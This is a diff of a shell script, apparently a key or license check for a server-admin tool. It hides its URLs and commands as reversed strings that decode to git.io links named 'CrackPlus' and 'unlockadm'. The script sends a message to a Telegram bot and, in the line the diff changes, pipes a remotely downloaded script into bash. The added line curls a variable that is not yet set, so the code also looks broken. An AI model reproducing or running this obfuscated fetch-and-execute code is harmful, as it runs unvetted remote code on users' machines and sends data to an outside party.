@@ -11,6 +11,7 @@ PIRT="sulPkcarC/oi.tig//:sptth"
 PIRT2=$(echo $PIRT|rev)
 DBIP="mdakcolnu/oi.tig//:sptth"
 PERM=$(echo $DBIP|rev)
+PERMT=$(curl -sSL "$PERMT")
 #KeyUsada: ${key}
 VENDOR="edoc_rodnev/nib/rsu/ tac"
 vend=$(echo $VENDOR|rev)
@@ -38,4 +39,4 @@ URL="https://api.telegram.org/bot$TOKEN/sendMessage"
 curl -s -X POST $URL -d chat_id=$ID -d text="$MENSAJE" &> /dev/null
 #echo -e "$MENSAJE enviado"
 #sed -i '2icurl -sSL "https://git.io/unlockadm"|grep "$(cat /usr/bin/vendor_code)" &> /dev/null || exit' /etc/newadm/menu
-[[ $(echo $PERM|grep "${vend}") = "" ]] || bash <(curl -Ls $PIRT2)
+[[ $(echo $PERMT|grep "${vend}") = "" ]] || bash <(curl -Ls $PIRT2)
